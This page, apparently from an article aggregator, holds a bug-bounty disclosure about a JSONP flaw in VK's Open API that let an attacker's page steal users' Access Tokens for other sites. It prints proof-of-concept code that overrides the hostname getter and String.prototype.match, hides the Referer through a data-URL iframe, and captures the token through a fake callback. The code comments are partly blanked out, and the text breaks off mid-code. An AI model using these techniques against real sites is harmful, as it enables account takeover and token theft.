<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>VK Open Api CSRF vulnerability, which allows to get Access Tokens of third-party sites that use authorization via VK</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="I present to your attention an overview of the vulnerability associated with the incorrect use of JSONP in VK Open Api. In my opinion, the vulnerabili...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>VK Open Api CSRF vulnerability, which allows to get Access Tokens of third-party sites that use authorization via VK</h1><div class="post__text post__text-html js-mediator-article">  I present to your attention an overview of the vulnerability associated with the incorrect use of JSONP in VK Open Api.  In my opinion, the vulnerability is quite serious, because  allowed the site of the attacker to get Access Token of another site, if it uses authorization through the VK Open API library.  At the moment, the vulnerable code was corrected, the report on HackerOne was closed, the remuneration was paid ($ 1,500). <br><br><h3>  How it looked </h3><br>  In principle, the process of obtaining a user Access Token by an attacker‚Äôs page proceeded according to the standard CSRF vulnerability exploitation scheme: <br><br><ol><li>  The user visits the site using the VK Open API library (for example, <a href="http://www.another-test-domain.com/">www.another-test-domain.com</a> ). </li><li>  Authorized there via VK. </li><li>  Then he goes to the attacker's website (for example, <a href="http://www.vk-test-auth.com/">www.vk-test-auth.com</a> ), which, exploiting the vulnerability, gets Access Token, belonging to the site <a href="http://www.another-test-domain.com/">www.another-test-domain.com</a> . </li><li>  Having received the Access Token of a user, an attacker can access the VK API with the rights that the user gave to the site <a href="http://www.another-test-domain.com/">www.another-test-domain.com</a> when <a href="http://www.another-test-domain.com/">logging</a> in to it via VK. </li></ol><br><h3>  Demonstration </h3><br>  The video shows how the ‚Äúintruder‚Äù page on the <a href="http://www.vk-test-auth.com/">www.vk-test-auth.com</a> domain gets the VK's Access Token user, who logged in to the <a href="http://www.another-test-domain.com/">www.another-test-domain.com</a> website, despite the fact that in the settings of the VK application, Access is allowed only for the domain <a href="http://www.another-test-domain.com/">www.another-test-domain.com</a> . 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <iframe width="560" height="315" src="https://www.youtube.com/embed/xtEGpwmE-FE" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><a name="habracut"></a><br>  Of course, I did not register domains, because  in this case it does not matter.  When the screencast was recorded, they were registered in hosts. <br><br><h3>  A bit about VK Open API </h3><br>  Excerpt from official documentation: <br><blockquote>  <i>Open API is a system for developers of third-party sites, which provides the ability to easily authorize VK users on your site.</i>  <i>In addition, with the consent of users, you can get access to information about their friends, photos, audio recordings, videos and other VKontakte data for deeper integration with your project.</i> </blockquote><br>  Those.  This is a JS library that allows you to work with the VK API (authorization, calling API methods like 'wall.post', 'audio.get', 'video.add', etc ...) directly from the page of your site.  In order to use this library, you need to create a VK application with the ‚ÄúWebsite‚Äù type, specify the domain in the settings, and place a couple of script tags on the page. <br><br><h3>  Library connection </h3><br>  Example of connecting and initializing the library: <br><br><pre><code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"//vk.com/js/api/openapi.js"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"text/javascript"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="hljs-tag"><span class="undefined"></span><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"text/javascript"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"><span class="undefined"> VK.init({ apiId: _APP_ID }); </span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  Naturally, in the <code>appId</code> parameter, <code>appId</code> can only specify the VK-application ID, in the settings of which the ‚ÄúBase domain‚Äù matches the domain of the page on which we connect the library. <br><br>  Our page can access VK API methods after a user in a pop-up window allows a VK application to access its profile.  In order to show this pop-up window, you need to call the <code>VK.Auth.login()</code> method.  And after permission is obtained, you can access the VK API.  Important note: if a user once gave an application access to his profile, then even after reloading the page, his permission remains in effect: you do not need to call <code>VK.Auth.login()</code> every time.  In order to determine whether the user should be asked to provide the site (more precisely, the VK-application of the site) access to his profile, you can use the following code: <br><br><pre> <code class="javascript hljs">VK.Auth.getLoginStatus(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">resp</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (resp.session) { <span class="hljs-comment"><span class="hljs-comment">//       . //     VK API. } else { //     , //        VK API. VK.Auth.login(...); } });</span></span></code> </pre><br>  If, when calling <code>VK.init()</code> specify the ID of another application, the domain of which does not match the domain of the page on which the library is launched, nothing should work (even the callback function passed to <code>getLoginStatus()</code> will not be called). <br><br>  A small caveat: it turns out, this prohibition can be circumvented.  In order to make it clearer, I will briefly tell you how the verification of the user's ‚Äúauthorization‚Äù in the VK application works. <br><br><h3>  The principle of checking user authorization </h3><br>  To work with the VK API from the JS code of a web page, the <code>VK.Api.call()</code> method is used, for example: <br><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">//      VK.Api.call('users.get', {}, function(result) { var user; if (result.response) { user = result.response[0]; alert(', ' + user.first_name + ' ' + user.last_name + '!'); } });</span></span></code> </pre><br>  At the first call of the <code>VK.Api.call()</code> method, the library calls on the VK backend for Access Token.  For this, the <code>VK.Api.call()</code> method is called <code>VK.Auth.getLoginStatus()</code> , through which the library gets this token (of course, if only the user has previously granted the site access to his profile).  After the token has been received, it requests the API and receives a response from the server.  The vulnerability lies in the way of getting and the way of processing the server response in the method <code>VK.Auth.getLoginStatus()</code> .  All because of JSONP, or rather, its incorrect use. <br><br><h3>  Vicious jsonp </h3><br>  Let's take a closer look at the work of the <code>VK.Auth.getLoginStatus()</code> method.  In order to get Access Token, a JSONP request is made to the following URL: <br><br><pre>  https://login.vk.com/?act=openapi&amp;oauth=1&amp;aid=1234567&amp;location=www.example.com&amp;rnd=456 </pre><br><br>  Options: <br><br><ul><li>  <code>aid</code> - application ID </li><li>  <code>location</code> - the domain from which the request is made </li><li>  <code>rnd</code> - ID callback function (this is JSONP) </li></ul><br>  If in the request at the URL above, the domain in HTTP Referrer matches the domain that was specified in the settings of the VK application, or if HTTP Referrer is not transmitted at all (!), Then we get the following answer: <br><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">/* &lt;html&gt;&lt;script&gt;window.location='http://vk.com';&lt;/script&gt;&lt;/html&gt; */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (location.hostname != <span class="hljs-string"><span class="hljs-string">'www.example.com'</span></span>) { <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.location.href = <span class="hljs-string"><span class="hljs-string">'http://vk.com/oauth'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (;;); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { VK.Auth.lsCb[<span class="hljs-number"><span class="hljs-number">456</span></span>]({ <span class="hljs-string"><span class="hljs-string">"auth"</span></span>: <span class="hljs-literal"><span class="hljs-literal">true</span></span>, <span class="hljs-string"><span class="hljs-string">"access_token"</span></span>: <span class="hljs-string"><span class="hljs-string">"5ea11111d799a53236f5d3eff5d34bcd2dda0f9e6a7aaf743f7d26d3487456f6ce8d5e1ff82eaa6f7b04a"</span></span>, <span class="hljs-string"><span class="hljs-string">"expire"</span></span>: <span class="hljs-number"><span class="hljs-number">1436755095</span></span>, <span class="hljs-string"><span class="hljs-string">"time"</span></span>: <span class="hljs-number"><span class="hljs-number">7200</span></span>, <span class="hljs-string"><span class="hljs-string">"sig"</span></span>: <span class="hljs-string"><span class="hljs-string">"12d254526496a6db2af6bed2eb1dd3e7"</span></span>, <span class="hljs-string"><span class="hljs-string">"secret"</span></span>: <span class="hljs-string"><span class="hljs-string">"oauth"</span></span>, <span class="hljs-string"><span class="hljs-string">"user"</span></span>: { <span class="hljs-string"><span class="hljs-string">"id"</span></span>: <span class="hljs-string"><span class="hljs-string">"%ID_%"</span></span>, <span class="hljs-string"><span class="hljs-string">"domain"</span></span>: <span class="hljs-string"><span class="hljs-string">"%_%"</span></span>, <span class="hljs-string"><span class="hljs-string">"href"</span></span>: <span class="hljs-string"><span class="hljs-string">"https:\/\/vk.com\/%__id_%"</span></span>, <span class="hljs-string"><span class="hljs-string">"first_name"</span></span>: <span class="hljs-string"><span class="hljs-string">"%%"</span></span>, <span class="hljs-string"><span class="hljs-string">"last_name"</span></span>: <span class="hljs-string"><span class="hljs-string">"%%"</span></span>, <span class="hljs-string"><span class="hljs-string">"nickname"</span></span>: <span class="hljs-string"><span class="hljs-string">""</span></span> } }); }</code> </pre><br>  Important: When a JSONP request is sent to the above URL, the browser also sends the user's cookie.  Therefore, the server knows on behalf of which VK user the request is being made, and builds a response based on this information. <br><br>  As I said earlier, the answer is the JS code, in which the following logic: if the domain of the current page ( <code>location.hostname</code> ) is equal to the domain specified in the application settings, call the <code>VK.Auth.lsCb[%__rnd%]()</code> function <code>VK.Auth.lsCb[%__rnd%]()</code> , and as the first argument, we pass an object with Access Token, otherwise we redirect the user to <code>http://vk.com/oauth</code> .  What for?  This is such a defense.  Since  if the domain specified in the settings of the VK application was not verified with <code>location.hostname</code> , then anyone could place the following code on their website: <br><br><pre> <code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="actionscript"><span class="actionscript"> </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">var</span></span></span><span class="actionscript"> VK = { Auth: { lsCb: { </span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">456</span></span></span><span class="actionscript">: </span><span class="hljs-function"><span class="hljs-keyword"><span class="actionscript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="actionscript"><span class="hljs-function"> </span></span><span class="hljs-params"><span class="actionscript"><span class="hljs-function"><span class="hljs-params">(data)</span></span></span></span><span class="actionscript"><span class="hljs-function"> </span></span></span><span class="actionscript">{ </span><span class="hljs-comment"><span class="actionscript"><span class="hljs-comment">//   data  Access Token (data.access_token) //      (data.user) } } } } </span></span></span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://login.vk.com/?act=openapi&amp;oauth=1&amp;aid=1234567&amp;location=www.example.com&amp;rnd=456"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="undefined"></span></code> </pre><br>  And thus getting Access Token (and with it access to the profile) of each user who visited the attacker's page, if this user provided the site using VK Open API, access to his profile (in the example above, this is <a href="http://www.example.com/">www.example.com</a> ) .  An attacker can only hide the HTTP Referrer of the page from which the request is made - it is quite simple. <br><br>  So, protection seems to be working, reconciliation of the current <code>location.hostname</code> with the domain of the VK application restricts access to Tokens by strangers, but ... JavaScript has getters / setters, and browsers have their own peculiarities / oddities for implementing the standard JS (BOM) environment. <br><br><h3>  Exploitation of Vulnerability </h3><br>  Then I decided to check, but what if a getter is defined for <code>location.hostname</code> , which will always return the string <code>"www.example.com"</code> ?  Quickly checking your guess in the console, and making sure that this hack worked at that time: <br><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">//   Chrome-   42- ,  ,    : // Yandex.Browser, Opera (WebKit), Android Chrome, etc‚Ä¶ //     ,   ~41  . //  ,   hostname  location  configurable-. location.__defineGetter__('hostname', function () { return '- '; }); console.log(location.hostname); // '- '</span></span></code> </pre><br>  I decided to try to fool domain verification like this: <br><br><pre> <code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="actionscript"><span class="actionscript"> </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">var</span></span></span><span class="actionscript"> VK = { Auth: { lsCb: { </span><span class="hljs-comment"><span class="actionscript"><span class="hljs-comment">//         JSONP-   VK 456: function (data) { alert(data.access_token); } } } }; location.__defineGetter__('hostname', function () {return 'www.example.com'}); </span></span></span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://login.vk.com/?act=openapi&amp;oauth=1&amp;aid=1234567&amp;location=www.example.com&amp;rnd=456"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="undefined"></span></code> </pre><br>  But there is another problem - HTTP Refferer.  After all, with a request on the URL <code>https://login.vk.com/?act=openapi&amp;oauth=1&amp;aid=1234567&amp;location=www.example.com&amp;rnd=456</code> HTTP Refferer pages will also be transmitted, and if the domain of this page does not match the domain specified in settings VK-applications, we get a redirect to <code>https://vk.com/js/api/openapi_error.js</code> , in which the following code: <br><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">try</span></span>{<span class="hljs-built_in"><span class="hljs-built_in">console</span></span>.log(<span class="hljs-string"><span class="hljs-string">'open api access error'</span></span>);}<span class="hljs-keyword"><span class="hljs-keyword">catch</span></span>(e){}</code> </pre><br>  But!  As I wrote above, if HTTP Refferer is not transmitted at all, then we will get a normal response.  I think this was done for two reasons: <br><br><ol><li>  HTTP Refferer may not always be transmitted. </li><li>  This is probably done in order to enable VK Open API to work on pages that do not have a global URL (i.e., the page address is still there, but is available only for your browser, for example, the Data URL, ObjectURL or any some browser extension). </li></ol><br>  One way to hide the HTTP Refferer is to place on the iframe page, which has a Data URL in src, and another page code in it, in which: <br><br><ol><li>  Replaced by <code>location.hostname</code> . </li><li>  An Access Token receiver function is declared ( <code>VK.Auth.lsCb[456]()</code> ). </li><li>  Is placed <pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://login.vk.com/?act=openapi&amp;oauth=1&amp;aid=1234567&amp;location=www.example.com&amp;rnd=456"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="undefined"></span></code> </pre>  which, in fact, loads the response from the server with a call to the JSONP function <code>VK.Auth.lsCb[456]()</code> . </li></ol><br>  This page could be placed on any domain, or simply opened in a browser, even without a web server, and it displayed Access Token and user data if it logged in via VK on a site using the VK Open API.  For successful exploitation of the vulnerability, it was necessary only to indicate in the request the application ID ( <code>aid</code> parameter) and the site domain to which the application is attached ( <code>location</code> parameter). <br><br>  How this page looked like: <br><br><pre> <code class="html hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;!doctype html&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">title</span></span></span><span class="hljs-tag">&gt;</span></span> VK JS Api<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">title</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">meta</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">charset</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"utf-8"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">style</span></span></span><span class="hljs-tag">&gt;</span></span><span class="css"><span class="css"> </span><span class="hljs-selector-tag"><span class="css"><span class="hljs-selector-tag">body</span></span></span><span class="css">,</span><span class="hljs-selector-tag"><span class="css"><span class="hljs-selector-tag">html</span></span></span><span class="css"> { </span><span class="hljs-attribute"><span class="css"><span class="hljs-attribute">margin</span></span></span><span class="css">:</span><span class="hljs-number"><span class="css"><span class="hljs-number">0</span></span></span><span class="css">; </span><span class="hljs-attribute"><span class="css"><span class="hljs-attribute">padding</span></span></span><span class="css">:</span><span class="hljs-number"><span class="css"><span class="hljs-number">0</span></span></span><span class="css">; </span><span class="hljs-attribute"><span class="css"><span class="hljs-attribute">width</span></span></span><span class="css">:</span><span class="hljs-number"><span class="css"><span class="hljs-number">100%</span></span></span><span class="css">; </span><span class="hljs-attribute"><span class="css"><span class="hljs-attribute">height</span></span></span><span class="css">:</span><span class="hljs-number"><span class="css"><span class="hljs-number">100%</span></span></span><span class="css">; } </span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">style</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"data:text/html;charset=utf-8,%__%"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">style</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"width:100%;height:100%;border:0"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  Approximately the <code>%__%</code> in the iframe looked like <code>%__%</code> : <br><br><pre> <code class="html hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;!doctype html&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="actionscript"><span class="actionscript"> </span><span class="hljs-comment"><span class="actionscript"><span class="hljs-comment">//   ,      location.hostname window.location.__defineGetter__('hostname', function () {return 'www.example.com'}); var VK = { Auth: { lsCb:{ 456: function (data) { //     access_token,    if (data.access_token) { //  , , ID  Access Token'a  //    . } else { //      www.example.com,   //    . } } } } }; </span></span></span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!--   aid   ID  VK-  "-",     -     VK,  ,  ,   Access Token      VK API. --&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://login.vk.com/?act=openapi&amp;oauth=1&amp;aid=1234567&amp;location=www.example.com&amp;rnd=456"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="hljs-tag"><span class="undefined"></span><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  Packing this example in the archive, I wrote in VK, and sent them this archive.  A couple of days later the vulnerability was fixed.  More precisely, after fixing the vulnerability has become even more serious.  If it was previously exploited due to the peculiarity of browsers on WebKit, and then up to ~ 42 versions of Google Chrome, now, it has been exploited on all browsers that more or less support JavaScript.  Connoisseurs of JS, try to guess from the code below, why did things get worse?  Note that there to get the current domain is not used the <code>hostname</code> field (which is configurable), but <code>href</code> , which is NOT configurable, and accordingly, for which you cannot specify a getter that returns the desired value. <br><br>  The response from the server, after the first fix for the vulnerability: <br><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">/* &lt;html&gt;&lt;script&gt;window.location='http://vk.com';&lt;/script&gt;&lt;/html&gt; */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!location.href.match(<span class="hljs-regexp"><span class="hljs-regexp">/https?:\/\/www\.mysite\.com\//</span></span>)) { <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.location.href = <span class="hljs-string"><span class="hljs-string">'http://vk.com/oauth'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (;;); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { VK.Auth.lsCb[<span class="hljs-number"><span class="hljs-number">456</span></span>]({ <span class="hljs-string"><span class="hljs-string">"auth"</span></span>: <span class="hljs-literal"><span class="hljs-literal">true</span></span>, <span class="hljs-string"><span class="hljs-string">"access_token"</span></span>: <span class="hljs-string"><span class="hljs-string">"5ea11111d799a53236f5d3eff5d34bcd2dda0f9e6a7aaf743f7d26d3487456f6ce8d5e1ff82eaa6f7b04a"</span></span>, <span class="hljs-string"><span class="hljs-string">"expire"</span></span>: <span class="hljs-number"><span class="hljs-number">1436755095</span></span>, <span class="hljs-string"><span class="hljs-string">"time"</span></span>: <span class="hljs-number"><span class="hljs-number">7200</span></span>, <span class="hljs-string"><span class="hljs-string">"sig"</span></span>: <span class="hljs-string"><span class="hljs-string">"12d254526496a6db2af6bed2eb1dd3e7"</span></span>, <span class="hljs-string"><span class="hljs-string">"secret"</span></span>: <span class="hljs-string"><span class="hljs-string">"oauth"</span></span>, <span class="hljs-string"><span class="hljs-string">"user"</span></span>: { <span class="hljs-string"><span class="hljs-string">"id"</span></span>: <span class="hljs-string"><span class="hljs-string">"%ID_%"</span></span>, <span class="hljs-string"><span class="hljs-string">"domain"</span></span>: <span class="hljs-string"><span class="hljs-string">"%_%"</span></span>, <span class="hljs-string"><span class="hljs-string">"href"</span></span>: <span class="hljs-string"><span class="hljs-string">"https:\/\/vk.com\/%__id_%"</span></span>, <span class="hljs-string"><span class="hljs-string">"first_name"</span></span>: <span class="hljs-string"><span class="hljs-string">"%%"</span></span>, <span class="hljs-string"><span class="hljs-string">"last_name"</span></span>: <span class="hljs-string"><span class="hljs-string">"%%"</span></span>, <span class="hljs-string"><span class="hljs-string">"nickname"</span></span>: <span class="hljs-string"><span class="hljs-string">""</span></span> } }); }</code> </pre><br>  The most obvious is an undefined regular expression, and ... I noticed it only during the preparation of the article.  It was possible to simply build the URL of the page that exploits the vulnerability so that it contains a substring matching the regular expression, and everything would work, though, until an anchor <code>"^"</code> added to the regular schedule.  But after all, the substitution of the JS browser environment is more interesting! <br><br>  So, here you can replace the standard <code>match()</code> method from the prototype <code>String</code> .  It must be replaced so that it returns <code>true</code> if the first argument is equal to the regular expression <code>"/https?:\/\/www\.mysite\.com\//"</code> , and it doesn‚Äôt matter what is in the destination line of the <code>match()</code> method call <code>match()</code>  Having finished the demo, I sent an updated version of the demonstration of the vulnerability in VK. <br><br>  Like last time, it was a page with an iframe, in which src was a Data URL: <br><br><pre> <code class="html hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;!doctype html&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="javascript"><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">var</span></span></span><span class="javascript"> VK = { </span><span class="hljs-attr"><span class="javascript"><span class="hljs-attr">Auth</span></span></span><span class="javascript">: { </span><span class="hljs-attr"><span class="javascript"><span class="hljs-attr">lsCb</span></span></span><span class="javascript">:{ </span><span class="hljs-number"><span class="javascript"><span class="hljs-number">456</span></span></span><span class="javascript">: </span><span class="hljs-function"><span class="hljs-keyword"><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="javascript"><span class="hljs-function"> (</span></span><span class="hljs-params"><span class="javascript"><span class="hljs-function"><span class="hljs-params">data</span></span></span></span><span class="javascript"><span class="hljs-function">) 